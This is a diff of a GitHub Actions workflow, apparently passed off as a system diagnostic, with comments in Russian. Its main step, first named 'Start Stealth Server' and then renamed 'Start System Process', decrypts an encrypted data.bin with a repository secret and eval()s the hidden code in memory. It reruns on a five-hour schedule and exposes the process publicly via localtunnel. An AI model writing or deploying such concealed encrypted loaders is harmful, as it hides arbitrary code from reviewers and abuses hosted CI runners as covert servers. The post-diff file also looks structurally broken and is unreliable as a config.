@@ -1,34 +1,15 @@
-name: System_Diagnostic_Core
-
-on:
-  workflow_dispatch:      # Кнопка ручного запуска в Actions
-  schedule:
-    - cron: '0 */5 * * *' # Авто-перезапуск каждые 5 часов
-
-jobs:
-  service-runtime:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Install Dependencies
-        run: npm install peer localtunnel
-
-      - name: Start Stealth Server
+- name: Start System Process
         env:
-          # Твой секретный ключ из Settings -> Secrets
           CORE_ACCESS_TOKEN: ${{ secrets.MASTER_KEY }}
         run: |
-          echo "--- ТВОЙ ПАРОЛЬ (IP СЕРВЕРА) НИЖЕ ---"
+          echo "--- ПРОВЕРКА ФАЙЛОВ ---"
+          ls -la
+          echo "--- ТВОЙ ПАРОЛЬ (IP) НИЖЕ ---"
           curl -s ifconfig.me
-          echo -e "\n------------------------------------"
+          echo -e "\n----------------------------"
           
-          # Расшифровка data.bin и запуск server.js прямо в памяти
-          node -e "const c=require('crypto'),fs=require('fs');const d=fs.readFileSync('data.bin'),s=d.slice(0,16),i=d.slice(16,32),e=d.slice(32),k=c.pbkdf2Sync(process.env.CORE_ACCESS_TOKEN,s,100000,32,'sha256'),p=c.createDecipheriv('aes-256-cbc',k,i);let r=p.update(e);r=Buffer.concat([r,p.final()]);eval(r.toString());" &
+          # Запуск с явным указанием пути ./data.bin
+          node -e "const c=require('crypto'),fs=require('fs');const d=fs.readFileSync('./data.bin'),s=d.slice(0,16),i=d.slice(16,32),e=d.slice(32),k=c.pbkdf2Sync(process.env.CORE_ACCESS_TOKEN,s,100000,32,'sha256'),p=c.createDecipheriv('aes-256-cbc',k,i);let r=p.update(e);r=Buffer.concat([r,p.final()]);eval(r.toString());" &
           
-          # Ожидание загрузки ноды
           sleep 15
-          
-          # Запуск туннеля. Замени subdomain на свой уникальный!
           npx lt --port 9000 --subdomain my-secure-mesh-node
